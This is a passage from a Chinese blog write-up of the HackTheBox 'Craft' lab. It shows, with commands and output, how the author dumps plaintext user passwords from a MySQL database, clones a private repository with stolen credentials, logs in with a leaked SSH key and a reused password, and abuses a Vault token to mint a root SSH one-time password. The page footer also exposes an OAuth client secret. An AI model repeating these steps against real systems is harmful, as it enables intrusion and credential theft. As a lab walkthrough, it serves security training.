+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-40-26.png" alt></p>
+<p>尝试访问数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/opt/app # mysql</span><br><span class="line">/bin/sh: mysql: not found</span><br></pre></td></tr></table></figure>
+
+<p>当然，在这个监狱里也没有<code>mysql</code>可用……早些时候我注意到一个数据库测试脚本。由于没有其他可用的内容，我们将使用此python脚本进行编辑。首先，让我们列出表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">"SELECT table_name FROM information_schema.tables;"</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">            print(row)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>
+
+<p>运行此脚本将返回两个表：<code>brew</code>和<code>users</code>。当然，让我们通过编辑<code>dbtest.py</code>脚本列出用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- sql = &quot;SELECT table_name FROM information_schema.tables;&quot;</span><br><span class="line">+ sql = &quot;SELECT * FROM user;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># python dbtest.py</span></span><br><span class="line">&#123;<span class="string">'id'</span>: 1, <span class="string">'username'</span>: <span class="string">'dinesh'</span>, <span class="string">'password'</span>: <span class="string">'4aUh0A8PbVJxgd'</span>&#125;</span><br><span class="line">&#123;<span class="string">'id'</span>: 4, <span class="string">'username'</span>: <span class="string">'ebachman'</span>, <span class="string">'password'</span>: <span class="string">'llJ77D8QFkLPQB'</span>&#125;</span><br><span class="line">&#123;<span class="string">'id'</span>: 5, <span class="string">'username'</span>: <span class="string">'gilfoyle'</span>, <span class="string">'password'</span>: <span class="string">'ZEU3N8WNM2rh4T'</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>有几个使用纯文本密码的用户：</strong></p>
+<ul>
+<li>尝试每个<code>ssh</code>都行不通。</li>
+<li>不能用作API凭证</li>
+</ul>
+<p>所以剩下的就是回到Gogs实例。登录为<code>gilfoyle</code>可让我们访问一个非常有趣的私有存储库：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-40-27.png" alt></p>
+<p>让我们克隆它来探索它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ GIT_SSL_NO_VERIFY=true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git</span><br></pre></td></tr></table></figure>
+
+<p>首先引起注意的是同时<code>.ssh</code>包含公钥和私钥的文件夹。我们应该能够使用<code>gilfoyle</code>通过SSH 进行登录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 600 .ssh/id_rsa</span><br><span class="line">$ ssh gilfoyle@craft.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Enter passphrase for key &apos;id_rsa&apos;:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:26:05 2019 from 10.10.15.50</span><br><span class="line">gilfoyle@craft:~$</span><br></pre></td></tr></table></figure>
+
+<p>密钥需要一个密码短语<code>id_rsa</code>，幸运的是，我们遇到了密码重用的情况，并且<code>ZEU3N8WNM2rh4T</code>在数据库转储中找到的密码是有效的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat user.txt</span><br><span class="line">bbfxxxxxxxxxxxxxa612d4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_17-56-11.png" alt></p>
+<h1 id="Elevation"><a href="#Elevation" class="headerlink" title="Elevation"></a>Elevation</h1><p>对用户而言，<code>gilfoyle</code>没有什么特别吸引眼球的，并且该盒的配置似乎不错。枚举后，我们仍然注意到一个不常见的ssh配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>检查主目录中的文件还会显示一个可能有用的令牌：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ls -a</span><br><span class="line">.  ..  .bashrc	.config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo</span><br><span class="line">gilfoyle@craft:~$ cat .vault-token</span><br><span class="line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><br></pre></td></tr></table></figure>
+
+<p>我们再次注意到这与<code>Vault</code>有关，我们已经在<code>craft-infra</code>存储库中看到了它。挖吧</p>
+<p>我对<code>Vault</code>一无所知，因此我检查了他们的网站：</p>
+<blockquote>
+<p>用于秘密管理，加密即服务和特权访问管理的工具 <a href="https://www.vaultproject.io/" target="_blank" rel="noopener">https://www.vaultproject.io/</a></p>
+</blockquote>
+<h2 id="利用Vault获取SSH根密码"><a href="#利用Vault获取SSH根密码" class="headerlink" title="利用Vault获取SSH根密码"></a>利用Vault获取SSH根密码</h2><p>该文件<code>craft-infra/src/master/vault/secrets.sh</code>在<code>craft-infra</code>仓库看起来很有希望：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># set up vault secrets backend</span><br><span class="line"></span><br><span class="line">vault secrets enable ssh</span><br><span class="line"></span><br><span class="line">vault write ssh/roles/root_otp \</span><br><span class="line">    key_type=otp \</span><br><span class="line">    default_user=root \</span><br><span class="line">    cidr_list=0.0.0.0/0</span><br></pre></td></tr></table></figure>
+
+<p>它确认Vault是用于ssh访问root的。<code>key_type=otp</code>似乎意味着它是一种一次性密码机制。</p>
+<p>经过一番谷歌搜索，我们在Vault上找到了以下文档：</p>
+<blockquote>
+<p>一次性SSH密码（OTP）SSH机密引擎类型允许Vault服务器每次客户端希望使用远程主机上的helper命令通过SSH进入远程主机时执行一次一次性密码。 <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" target="_blank" rel="noopener">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
+</blockquote>
+<p>好了，我们有所有需要的信息。让我们为根帐户生成一个一次性密码！</p>
+<p>从这里开始，我将遵循上面链接的文档。首先，我们需要安装秘密引擎：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; gilfoyle@craft:~$ vault secrets enable ssh</span><br><span class="line">&gt; Successfully mounted &apos;ssh&apos; at &apos;ssh&apos;!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>然后，我们创建一个<code>key_type</code>参数设置为的角色<code>otp</code>。我将使用与输入相同的命令<code>craft-infra/src/master/vault/secrets.sh</code>来确保我们不会丢失任何内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/roles/root_otp \</span><br><span class="line">     key_type=otp \</span><br><span class="line">     default_user=root \</span><br><span class="line">     cidr_list=0.0.0.0/0</span><br><span class="line">Success! Data written to: ssh/roles/root_otp</span><br></pre></td></tr></table></figure>
+
+<p>下一步，我们为属于以下主机的远程主机的IP创建OTP凭据<code>otp_key_role</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110</span><br><span class="line">Key                Value</span><br><span class="line">---                -----</span><br><span class="line">lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d</span><br><span class="line">lease_duration     768h</span><br><span class="line">lease_renewable    false</span><br><span class="line">ip                 10.10.10.110</span><br><span class="line">key                3d32eb8a-61b1-3376-4402-dd15e72206f8</span><br><span class="line">key_type           otp</span><br><span class="line">port               22</span><br><span class="line">username           root</span><br></pre></td></tr></table></figure>
+
+<p>一切顺利。让我们启动一个新终端并尝试以以下身份登录<code>root</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ssh root@craft.htb</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:10:03 2019 from 127.0.0.1</span><br><span class="line">root@craft:~# </span><br><span class="line">root@craft:~# cat root.txt</span><br><span class="line">831dxxxxxxxxxxx11591</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-01-06_18-58-49.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2020/01/06/hackthebox-Craft/" title="hackthebox-Craft">https://wh0ale.github.io/2020/01/06/hackthebox-Craft/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/30/Dumping-Domain-Password-Hashes/" rel="next" title="Dumping Domain Password Hashes">
+                <i class="fa fa-chevron-left"></i> Dumping Domain Password Hashes
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">129</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#recon"><span class="nav-number">1.</span> <span class="nav-text">recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE"><span class="nav-number">2.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#docker-to-Physical-Machines"><span class="nav-number">3.</span> <span class="nav-text">docker to Physical Machines</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Elevation"><span class="nav-number">4.</span> <span class="nav-text">Elevation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用Vault获取SSH根密码"><span class="nav-number">4.1.</span> <span class="nav-text">利用Vault获取SSH根密码</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22:59</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
